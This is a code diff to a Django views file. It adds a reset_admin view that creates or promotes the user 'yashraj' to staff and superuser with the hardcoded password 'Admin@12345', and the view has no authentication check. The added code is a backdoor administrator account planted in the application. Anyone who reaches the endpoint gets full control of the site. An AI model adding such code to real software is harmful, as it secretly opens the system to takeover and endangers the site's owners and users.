@@ -28,3 +28,14 @@ def verify_batch(request, code):
         return render(request, 'core/verify.html', {
             'valid': False
         })
+    
+from django.contrib.auth.models import User
+from django.http import HttpResponse
+
+def reset_admin(request):
+    user, created = User.objects.get_or_create(username='yashraj')
+    user.is_staff = True
+    user.is_superuser = True
+    user.set_password('Admin@12345')
+    user.save()
+    return HttpResponse("Admin password reset successfully")
